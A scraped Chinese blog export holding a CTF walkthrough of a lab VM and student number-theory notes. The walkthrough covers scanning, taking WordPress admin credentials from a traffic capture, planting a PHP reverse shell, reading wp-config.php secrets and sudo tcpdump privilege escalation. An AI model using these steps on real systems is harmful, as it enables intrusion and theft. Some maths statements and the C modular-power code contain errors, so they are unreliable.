（3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。","text":"【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。 1.2 CTF各大题型简介 ¶1x03 CTF各大题型简介 MISC（安全杂项） 全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。 PPC（编程类） 全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。 CRYPTO（密码学） 全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。 REVERSE（逆向） 题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。 STEGA（隐写） 全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。 PWN（溢出） PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。 WEB（web类） WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web*站开始的。 ¶0x02 获取Web Developer中的flag ¶1x01 Net Discover 首先通过namp扫描存活的主机，成功发现了Web Developer； ¶1x02 Nmap信息收集 接下来使用Nmap扫描Web Developer检查一下端口的开放情况； nmap 10.34.80.3 可以看到开放了80端口和22端口，这两个端口的作用分别是http端口（网页）和ssh端口（远程登陆）； ¶1x03 访问网站 因为网站开放了80端口，所以可以尝试登陆http端口 发现有一个搭建了一个个人模块网站，这个网站应该是一个比较经典的CMS了，记得我当初刚买服务器的时候@visualDust给我搭了这一个这个网站。 ¶1x04 whatweb探寻 通过whatweb进行检测可以发现该网站的如下信息： 从内容信息中可以得到，该网站的CMS为WordPress； ¶1x05 wpscan WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。 ¶1x06 Dirb爆破 使用dirb来爆破网站的根目录； dirb -u http://10.34.80.3 找到一个 http://10.34.80.3/ipdata/ 感觉这个很像流量信息，进去看一看吧 ¶1x07 wireshark数据分析 在获取了网站数据流信息后，我们尝试使用wireshark进行一次分析；尝试搜索一下login，结果有惊奇的发现； 成功找到了登陆界面: 我们随便提交一个，找到信息post去的地址： 确定了之后就去找发送到相应url下的post信息； 尝试筛选http请求类型为post的请求，找到了这两个： 可以看到账号密码就在这里，密码好像是做了一定的加密，当时这个不是问题； 我们把burp打开，然后随便输入一个账号和密码，在burp里面给他改一下，然后再把请求放过去就可以了； 下图是我们的请求； 很明显可以发现，log对应的是用户名，pwd对应的是密码；然后我们把他给改掉 成功进入网站后台! ¶1x08 使用wordpress的插件漏洞进行提权 这里可以使用三种方案进行实现： ¶2x01 MeterSploit + reflex gallery 首先我们先需要给这个wordpress安装reflex gallery插件； 去plugins界面搜索一下reflex，安装上去就好； 当然了你也可以选择本地上传安装； 安装成功之后记得把插件激活一下！ 接下来使用msf来控制漏洞： 出现meterpreter&gt;说明可以控制了，我们可以在这里输入Linux命令来查看一些文件： 回退到/var/www/html之后可以看到wp-config.php； 查看一下里面的内容： 可以在里面找到数据库的用户和密码： ¶2x02 反弹Shell 上传反弹shell。http://pentestmonkey.net/tools/web-shells/php-reverse-shell 【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。 功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】 我们把代码稍微修改一下，ip改成10.34.80.3, 反弹端口设为4444； 首先需要把这里的theme给修改为Twenty Sixteen，记得点击Select，然后点击Leave！ 然后将php文件复制粘贴过来==》记得upload！ 注意一下，因为我实在找不到404.PHP的url路径，所以我就改了search.php，效果就是搜索的时候触发 还有一件事! , 因为刚才修改了theme，这里需要把对应的主界面也改了；（不改好像也行） 接下来我们使用kali的nc监听刚才设置的4444端口。 现在我们search一下就可以发现nc里面已经可以操作了！ 经过路径的探寻后找到了wp_config.php 文件 ¶2x03 利用文件管理插件（File manager）漏洞 这个没啥技术含量，安装了插件之后直接就可以查看了；这里就不写了 ¶1x09 ssh登陆该网站 这里我们尝试用上一步中获取的数据库密码来登陆 结果发现遇到了这个问题： 这里我们进行一下修改配置文件，sudo vim /etc/ssh/ssh_config打开这个文件，然后在最下面添加： # StrictHostKeyChecking ask改成StrictHostKeyChecking no 然后输入：ssh webdeveloper@10.34.80.3 成功登录了进来! 尝试查看发现权限不足： 查看一下可以执行的sudo命令 发现可以root权限执行tcpdump命令 创建攻击文件 tcpdump命令详解： -i eth0 从指定网卡捕获数据包 -w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果） -z [command] 运行指定的命令 -Z [user] 指定用户执行命令 -G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储 -W [num] 指定抓包数量 ¶0x03 实验小结 本次的实验中完整的做了一次从发现目标主机到获取flag的过程，在实现的过程中包括了 通过扫描发现目标主机 根据主机开放的80端口找到其的网页 通过扫描网页目录找到流量包 Wireshark解析流量包 获取管理员密码 根据网页的cms找到通用漏洞 tcpdump提权 总之这次的实验做的很爽","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【信息安全数学导论】同余","slug":"【信息安全数学导论】同余","date":"2020-12-03T18:03:43.000Z","updated":"2020-12-10T06:00:54.584Z","comments":true,"path":"2020/12/04/【信息安全数学导论】同余/","link":"","permalink":"http://example.com/2020/12/04/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E5%90%8C%E4%BD%99/","excerpt":"第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot m a=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n),则 b≡a(mod n)b \\equiv a(mod \\ n)b≡a(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)，b≡c(mod m)b \\equiv c(mod \\ m)b≡c(mod m)，则a≡c(mod m)a \\equiv c(mod \\ m)a≡c(mod m)","text":"第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot m a=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n),则 b≡a(mod n)b \\equiv a(mod \\ n)b≡a(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)，b≡c(mod m)b \\equiv c(mod \\ m)b≡c(mod m)，则a≡c(mod m)a \\equiv c(mod \\ m)a≡c(mod m) 由最小非负余数来判断同余 a，b模m同余的充分必要条件是a，b被m除的余数相同；其实我感觉这条性质是最接近同余这个名字的了，同余同余，两个数的余数相同不就叫做同余吗？ 通过整数a，b模m的加法运算和乘法运算的性质来判断a，b模m是否同余 如果a1≡b1(mod m)a_1 \\equiv b_1(mod \\ m)a1​≡b1​(mod m),a2≡b2(mod m)a_2 \\equiv b_2 (mod \\ m )a2​≡b2​(mod m) 则： （1）a1+a2≡b1+b2(mod m)a_1+a_2 \\equiv b_1 + b_2(mod \\ m)a1​+a2​≡b1​+b2​(mod m) （2）a1⋅a2≡b1⋅b2(mod m)a_1 \\cdot a_2 \\equiv b_1 \\cdot b_2(mod \\ m)a1​⋅a2​≡b1​⋅b2​(mod m) 如何便捷的判断n是 否可以被3或者9整除？（可以用于判断大数时候可以被3和9整除） 假设 m 是 n 各位数字的合，则： （i）3｜n的充分必要条件是`》3 ｜ m （ii）9｜n的充分必要条件是=〉 9｜m 如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot) (a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶同余的性质 设m是一个正整数，设d⋅a≡d⋅b(mod m)d \\cdot a \\equiv d \\cdot b(mod \\ m)d⋅a≡d⋅b(mod m). 如果(d,m) = 1即d和m互素，则 a≡b(mod m)a \\equiv b(mod \\ m) a≡b(mod m) ​ 这一点类似于同余的消去律？ 还有一条类似的性质：设a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) ，如果整数d∣(a,b,m)d | (a,b,m)d∣(a,b,m),则 ad≡bd(mod md)\\frac{a}{d} \\equiv \\frac{b}{d}(mod \\ \\frac{m}{d}) da​≡db​(mod dm​) 如果a，b关于mim_imi​（i从1到k）同余，那么a，b关于这一堆数的最大公倍数n同余； 设a≡b(mod p⋅q)a \\equiv b(mod \\ p \\cdot q)a≡b(mod p⋅q),则： (a,m)=(b,m)(a,m)=(b,m) (a,m)=(b,m) 如果 a≡b(mod c)a \\equiv b (mod \\ c)a≡b(mod c)且a≡b(mod d)a \\equiv b(mod \\ d)a≡b(mod d)，则： a≡b(mod [c,d])a \\equiv b(mod \\ [c,d]) a≡b(mod [c,d]) ¶剩余类和完全剩余系 ¶剩余类和剩余 由于同余是一种等价关系，对于整数m，可以把所有的整数分成m类，每一类对于m都同余；每一类都叫做m的一个剩余类；一般用CaC_aCa​来表示。CaC_aCa​是非空集合； 可以发现剩余类其实就是等价关系中的一个等价类；又扯到离散上去了，裂开； 设m是一个正整数，则 任何一个整数包含在一个CrC_rCr​中，0&lt;=r&lt;=m−10 &lt;= r &lt;= m-10&lt;=r&lt;=m−1 Ca=CbC_a = C_bCa​=Cb​的充分必要条件就是：a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) Ca与CbC_a与C_bCa​与Cb​的交集为空集的充分必要条件是： a≢(mod m)a \\not\\equiv (mod \\ m)a​≡(mod m) 一个剩余类中的任一个数都叫做该类的剩余，或者代表元 ¶完全剩余系 对于一个数m，现在有m个数，每一个都来自于不同的剩余类，那么这m个数就叫做模m的一个剩余系；记作Z/mZZ/mZZ/mZ或者ZmZ_mZm​。当 m=pm=pm=p为素数的时候也可以写成Fp=Z/pZ=ZpF_p = Z/pZ = Z_pFp​=Z/pZ=Zp​ m个整数构成一个完全剩余系的条件：其实在定义中也就可以发现了，m个整数r0,r1,r2,⋅⋅⋅,rm−1r_0,r_1,r_2, \\cdot \\cdot \\cdot ,r_{m-1}r0​,r1​,r2​,⋅⋅⋅,rm−1​为模m的一个完成剩余系的充分必要条件是他们模m两两不同余； 设m是正整数，a是满足（a，m）=1的整数，b是任意整数，若k遍历模m的一个完全剩余系，则：a⋅k+ba \\cdot k+ ba⋅k+b 也遍历模m的一个完全剩余系； 完全剩余系的加法原则？ 如果k1,k2k_1,k_2k1​,k2​分别遍历模m1,m2m_1,m_2m1​,m2​的完全剩余系,则：m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​，遍历模 m1⋅m2m_1 \\cdot m_2m1​⋅m2​的完全剩余系. 这条规则还可以拓展到多个模的情况； ¶简化剩余类与欧拉函数 ¶欧拉函数 一个正整数m，1到m-1中与m互素的整数的个数记作ϕ(x)\\phi(x)ϕ(x),通常叫做欧拉函数； 一个素数p，ϕ(p)=p−1\\phi(p)=p-1ϕ(p)=p−1 对于素数幂m=pαm=p^{\\alpha}m=pα，p为素数，则：ϕ(m)=pα−pα−1=m(1−1p)\\phi(m) = p^{\\alpha}-p^{\\alpha - 1} = m(1-\\frac{1}{p})ϕ(m)=pα−pα−1=m(1−p1​) ¶简化剩余类 如果剩余类中存在一个剩余与m互素，那么这个剩余类就叫做简化剩余类，简化剩余类中的剩余叫做简化剩余； 简化剩余类的这个定义与剩余的选取无关； 两个简化剩余的乘积仍然是简化剩余； 类比剩余系的概念，我们可以理解简化剩余系，∣(Z/mZ)∗∣=ϕ(m)|(Z/mZ)^*|=\\phi(m)∣(Z/mZ)∗∣=ϕ(m) 设m是一个整数数，若r1,r2,⋅⋅⋅rϕ(m)r_1,r_2, \\cdot \\cdot \\cdot r_{\\phi(m)}r1​,r2​,⋅⋅⋅rϕ(m)​是ϕ(x)\\phi(x)ϕ(x)个与m互素的整数，并且两两模m不同余，则r1,r2,⋅⋅⋅rϕ(m)r_1,r_2, \\cdot \\cdot \\cdot r_{\\phi(m)}r1​,r2​,⋅⋅⋅rϕ(m)​是模m的一个简化剩余系。 对于正整数m，若整数a满足(a,m)=1,如果k遍历模m的一个简化剩余系则a⋅ka \\cdot ka⋅k也遍历模m的一个简化剩余系。 对于正整数m，a是满足(a,m)=1的整数，则存在唯一的整数a‘，1 &lt;= a’ &lt; m 使得： a⋅a′≡1(mod m)a \\cdot a&#x27; \\equiv 1(mod \\ m) a⋅a′≡1(mod m) a’就叫做模m的逆元； 两个模的简化剩余系： 设m1，m2是互素的两个正整数，如果k1，k2分别遍历模m1和模m2的简化剩余系，则： m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2 m2​⋅k1​+m1​⋅k2​ 遍历模m1⋅m2m_1 \\cdot m_2m1​⋅m2​的简化剩余系. ¶欧拉函数的性质 ¶如何快速的求出欧拉函数值？ 设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n)ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； 幂次方的乘积应该如何求它的欧拉函数呢？ m=p1α1⋅⋅⋅p2αsm =p_1^{\\alpha_1} \\cdot \\cdot \\cdot p_2^{\\alpha_s } m=p1α1​​⋅⋅⋅p2αs​​ 则： ϕ(x)=m(1−1p1)⋅⋅⋅(1−1pk)\\phi(x) = m(1-\\frac{1}{p_1}) \\cdot \\cdot \\cdot (1-\\frac{1}{p_k}) ϕ(x)=m(1−p1​1​)⋅⋅⋅(1−pk​1​) 设p，q是不同的素数，则 ϕ(p⋅q)=p⋅q−p−q+1\\phi(p \\cdot q) = p \\cdot q - p -q +1 ϕ(p⋅q)=p⋅q−p−q+1 ¶欧拉定理、费马小定理和Wilson定理 ¶欧拉定理 设m数大于1的整数，如果是a满足（a，m）= 1的整数，则 aϕ(m)≡1(mod m)a^{\\phi(m)} \\equiv 1(mod \\ m) aϕ(m)≡1(mod m) ¶费马小定理 研究模m=p为素数时候，整数ak(mod p)a^k(mod \\ p)ak(mod p)的性质. 设p是一个素数，则对任意整数a，有 ap≡a(mod p)a^p \\equiv a(mod \\ p) ap≡a(mod p) 应用：当p为素数的时候，费马小定理可以快速的求出a (mod p) ¶Wilson定理 设p是一个素数，则 (p−1)!≡−1(mod p)(p-1)! \\equiv -1(mod \\ p) (p−1)!≡−1(mod p) 看到数字连乘的时候可以考虑使用Wilson定理 ¶模重复平方法 用于求大数平方的模 12345678910111213141516&quot;&quot;&quot;模重复平方法&quot;&quot;&quot;# 求解一个数的n次方的模# 比如12996的227次方模37909同余的结果a = 1num = 12996n = 227c = 37909while n: if n % 2 == 1: a = a * num % c num = (num ** 2) % c n //= 2print(a) 重要知识点： ¶判断两个数是否同余？ 根据定理：m｜(a-b) ,则a≡(mod m)a \\equiv (mod \\ m)a≡(mod m) a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)的充要条件是：a=b+q⋅ma=b+q \\cdot ma=b+q⋅m a,b对于m除的余数相同； ¶判断一个数n能否被3，7，9，11，13整除 =&gt; P57 （1）对于3和9 将n转化为10进制的科学记数法，n=ak⋅10k+...+a0n=a_k \\cdot 10^k + ... + a_0n=ak​⋅10k+...+a0​ （i）3｜n的充分必要条件是`》3 ｜ aia_iai​ （ii）9｜n的充分必要条件是=〉 9｜aia_iai​ （2）如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot) (a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶如何求模m的完全剩余系？ ==&gt; P64 （1）直接取得0，…，m-1即是一个完全剩余系 （2）对于从0到m-1的这个完全剩余系，可以对于某部分数再加上m的倍数; （3）如果已知一个完全剩余系kik_iki​,对于（a，m）=1，b是任意整数，a⋅ki+ba \\cdot k_i +ba⋅ki​+b也是一个完全剩余系 （4）如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m,且(m1,m2)=1(m_1,m_2)=1(m1​,m2​)=1,而k1k_1k1​ ，k2k_2k2​遍历m1,m2m_1,m_2m1​,m2​的完全剩余系，那么m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​则遍历模m的完全剩余系； ¶如何求一个数的欧拉函数？ ==&gt; P70 (1)设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n)ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； (2)对于任意的整数m： ϕ(m)=m⋅(1−1p1)(1−1p2)⋅⋅⋅\\phi(m)=m \\cdot (1-\\frac{1}{p_1})(1-\\frac{1}{p_2}) \\cdot \\cdot \\cdot ϕ(m)=m⋅(1−p1​1​)(1−p2​1​)⋅⋅⋅ p的来源是标准分解式 ==&gt; P70 ¶如何求模m的简化剩余系 ==&gt; P70 (1) 按照定义来，在最小非负完全剩余系中暴力判断每一个代表元是否与m互素，是的话保存；最后剩的就是一个最为简单的简化剩余系 (2) 同求完全剩余的第（3），如若已知kik_iki​，若存在一个a满足（a,m）=1，那么a⋅kia \\cdot k_ia⋅ki​也遍历模m的一个简化剩余系 (3) 同求完全剩余的第（4），如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m且(m1,m2)=1(m_1,m_2)=1(m1​,m2​)=1而k1,k2k_1,k_2k1​,k2​遍历m1,m2m_1,m_2m1​,m2​的简化剩余系，那么m2⋅k1+m1⋅k2m_2 \\cdot k_1 +m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​则遍历模m的简化剩余系； (4) 如若a是模m的原根，则m的简化剩余系就是a0,a1,...,aϕ(m)−1a^0,a^1,...,a^{\\phi(m)-1}a0,a1,...,aϕ(m)−1 ==&gt; P169 ¶如何快速计算bnb^nbn ==&gt; P80 采用模重复平凡计算法（也叫快速幂 ACM经典算法）： 对于bnb^nbn来说，如果按照正常的算法，那么需要运算n次，如果按照本算法，就只需要log2nlog_2nlog2​n次，时间复杂度大大减少； C实现： 123456789int fastpow(int base,int n,int mod)&#123; int ans=1; while(n)&#123; if(n&amp;1) ans*=base%mod; base*=base; n&gt;&gt;=1; &#125; return ans%mod;&#125; ¶如何求解一个数的逆元？ 枚举法：对于比较小的数可以通过肉眼 “看” 的方式直接口算出他的逆元 费马小定理：如果m为素数则逆元可以表达为：am−2 mod ma^{m-2} \\ mod \\ mam−2 mod m 拓展欧几里得算法： x是a的逆元可以表示为：ax=1(mod n)ax=1(mod \\ n)ax=1(mod n) ； 然后可以得到：ax−ny=1ax-ny = 1ax−ny=1; 之后运用拓展欧几里得算法求得：ax+ny=1ax+ny=1ax+ny=1的解即可 注意逆元存在的条件为（a，n）= 1","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【信息安全数学导论】整除","slug":"【信息安全数学导论】整除","date":"2020-12-03T18:03:25.000Z","updated":"2020-12-06T04:59:29.811Z","comments":true,"path":"2020/12/04/【信息安全数学导论】整除/","link":"","permalink":"http://example.com/2020/12/04/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E6%95%B4%E9%99%A4/","excerpt":"整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a，不能整除记作b∤ab\\nmid ab∤a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性：","text":"整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a，不能整除记作b∤ab\\nmid ab∤a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性： 若 b∣a，c∣bb\\mid a ，c\\mid bb∣a，c∣b 则 c∣ac \\mid ac∣a 整除的性质在加法和减法运算以及线性组合中都是可以保持 若 c∣a,c∣bc | a,c|bc∣a,c∣b 则 c｜a+bc｜a+bc｜a+b ，减法也是一样，线性组合中也是一样s⋅a+t⋅bs \\cdot a + t \\cdot bs⋅a+t⋅b 被 c 整除 这个整数也可以被推广到多个整数的线性组合 如果两个数互相整除，那么这两个数不是相等就是互为相反数 素数 总是正整数 从了1和自身没有一个数再能整除它了 如何快速的找到素数？==》 平凡除法 / 厄拉托赛师（Eratosthenes）算法 素数有无穷多个 欧几里得除法——最小非负余数 设a,b是两个整数，其中b&gt;0，则存在唯一的整数q和r使得a=q⋅b+r,0&lt;r&lt;ba = q \\cdot b + r, 0 &lt; r &lt; ba=q⋅b+r,0&lt;r&lt;b，q叫做a被b除所得的不完全商 最大公因子与广义欧几里德除法 最大公因数：因数中最大的一个，a和b的最大公因数记作（a，b） 一堆不全为0的数的公因数与这堆数加上绝对值后的公因数相同 Bezout等式的计算 ==》太难说明了，结合矩阵图理解吧 广义欧几里得算法：简单的来说就是当两个数比较大的时候来求这两个数的最大公因子，时间复杂度为O(n) 123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot;&quot;&quot;贝祖公式的实现&quot;&quot;&quot;import mathj = []s_j = []t_j = []q_j_1 = []r_j_1 = []# 规定a和ba = 3589b = 1613temp_a = atemp_b = b# 先求r_j_1和q_j_1r_j_1.append(temp_a)r_j_1.append(temp_b)while temp_a % temp_b != 0: # 向下取整 q = math.floor(temp_a / temp_b) q_j_1.append(q) r_j_1.append(temp_a - temp_b * q) temp = temp_b temp_b = temp_a - temp_b * q temp_a = temp# r_j_1.append(0)# q_j_1.append(math.floor(a / b))# 求s_j 和 t_j q12# 初始化s_j 和 t_js_j.append(1)t_j.append(0)s_j.append(0)t_j.append(1)for i in range(len(q_j_1)): s_j.append(-q_j_1[i] * s_j[i + 1] + s_j[i]) t_j.append(-q_j_1[i] * t_j[i + 1] + t_j[i])print(r_j_1)print(q_j_1)print(s_j)print(t_j)print(s_j[-1] * a + t_j[-1] * b) 最大公因子进一步的性质 如何找到两个较小的互素的整数，或者说如何构造互素的整数 (a(a⋅b),b(a,b))=1(\\frac{a}{(a \\cdot b)},\\frac{b}{(a,b)}) = 1 ((a⋅b)a​,(a,b)b​)=1 m为任意个正整数，则m⋅a,m⋅b=m⋅(a⋅b)m \\cdot a,m \\cdot b = m \\cdot (a \\cdot b)m⋅a,m⋅b=m⋅(a⋅b) 若非零整数d满足，d｜a且d｜b，则 (ad,bd)=(a,b)∣d∣(\\frac{a}{d},\\frac{b}{d}) = \\frac{(a,b)}{|d|} (da​,db​)=∣d∣(a,b)​ 设a，b，c是三个整数，且b≠0,c≠0b \\neq 0,c \\neq 0b​=0,c​=0 如果 （a，c）= 1 则 (ab,c)=(b,c)(ab,c) = (b,c) (ab,c)=(b,c) 如果c和一组数中的每一个数都互素，则它和这一组数的乘积也互素 设a，b，u，v都是不全为0的整数，如果 a=q⋅u+r⋅v,b=s⋅+t⋅v,a = q \\cdot u + r \\cdot v,b=s \\cdot + t \\cdot v, a=q⋅u+r⋅v,b=s⋅+t⋅v, 其中q, r , s, t是整数，且q⋅t−r⋅s=1q \\cdot t - r \\cdot s = 1q⋅t−r⋅s=1，则(a,b) = (u,v) 如果计算多个数的最大公因数？ == 》 两个两个算即可 2α−12^\\alpha-12α−1的整数及其最大公因数 设a和b是两个正整数，则2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数2^a-1和2^b-1除的最小非负余数是2^r-1,其中r是a被b除的最小非负余数2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数 2a−1和2b−1的最大公因数是2(a,b)−12^a-1和2^b-1的最大公因数是2^{(a,b)}-12a−1和2b−1的最大公因数是2(a,b)−1 整除的进一步性质 如果 c ｜ ab，（a，c）=1，则c｜b。其实很好理解因为a和c的最大公因子为1了，就可以推出来c一定是可以整出b的。 如果 p ｜ab 则 p｜a 或 p｜b ，这个也是比较明显的 最小公倍数 a和b的最小公倍数记作 [a,b][a,b][a,b] 若a｜D，b｜D，则[a,b] | D; 最小公倍数的一种计算方法（最小公倍数与最大公因数的关系）：[a,b]=a⋅b(ab˙)[a,b] = \\frac{a \\cdot b}{(a \\dot b)}[a,b]=(ab˙)a⋅b​ 如何计算多个最小公倍数？==》 两个两个计算 整数分解 